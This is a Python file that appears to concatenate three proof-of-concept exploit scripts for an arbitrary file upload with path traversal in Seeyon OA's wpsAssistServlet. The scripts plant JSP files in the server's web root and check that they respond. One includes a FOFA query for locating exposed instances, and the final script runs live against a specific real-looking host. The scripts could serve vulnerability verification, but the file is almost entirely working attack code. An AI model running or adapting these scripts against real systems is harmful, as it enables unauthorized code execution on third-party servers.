# -*- coding: utf-8 -*-
'''
@Time    : 2023-03-18 14:26
@Author  : whgojp
@File    : POC.py

'''
import requests
import threading

def check_url1(url):
    target_url = url + "seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg3.jsp&fileId=2"
    headers = {"Content-Type": "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b"}
    files = {
        "upload": ('../../../../ApacheJetspeed/webapps/ROOT/1523.xls','<% out.println("seeyon_vul3");%>', "application/vnd.ms-excel")
    }
    try:
        response = requests.post(target_url, headers=headers,files=files, timeout=5,verify=False)
        print(response.text)
        if response.status_code == 200:
            print(f"{url} is vulnerable.")
        else:
            print('1')
    except  EnvironmentError as e:
        print(e)

#check_url1('http://oa.servechina.com.cn:80')
# -*- coding: utf-8 -*-
'''
@Time    : 2023-03-18 14:26
@Author  : whgojp
@File    : POC.py

'''
import requests
from concurrent.futures import ThreadPoolExecutor
import threading

def check_url(url):
    target_url = url + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2"
    headers = {"Content-Type": "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b"}
    data = """--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name="upload"; filename="123.xls"
Content-Type: application/vnd.ms-excel

<% out.println("seeyon_vuln");%>
--59229605f98b8cf290a7b8908b34616b--
"""
    try:
        response = requests.post(target_url, headers=headers, data=data, timeout=5)
        if response.status_code == 200:
            print(response.text)
            print(f"{url} is vulnerable.")
            with open("result.txt", "a") as f:
                f.write(f"{url} is vulnerable.\n")
        else:
            pass
    except requests.exceptions.RequestException as e:
        pass
#check_url('http://oa.servechina.com.cn:80')

import requests
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 脚本信息
######################################################
NAME='Seeyon_OA_wpsAssistServlet_upload'
AUTHOR="CSeroad"
REMARK='致远OA wpsAssistServlet 任意文件上传'
FOFA_RULE='title="致远A8+协同管理软件.A6"'
######################################################



def poc(target):
    headers = {
               'Content-Type': 'multipart/form-data; boundary=-***'}
    data = '''
---***
Content-Disposition: form-data; name="upload"; filename=""\r\nContent-Type: application/vnd.ms-excel\r\n\r\n<% out.println("loglog");%>\r\n---***--'''
    vuln_url = target + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/logssss4.txt&fileId=2"
    try:
        requests.post(url=vuln_url,headers=headers,data=data,timeout=5, verify=False)
        r1 = requests.get(url = target+"/logssss4.txt")
        if 'loglog' in r1.text and r1.status_code == 200:
            print(r1.text)
        else:
            pass
    except Exception as e:
        pass
poc('http://oa.servechina.com.cn:80/')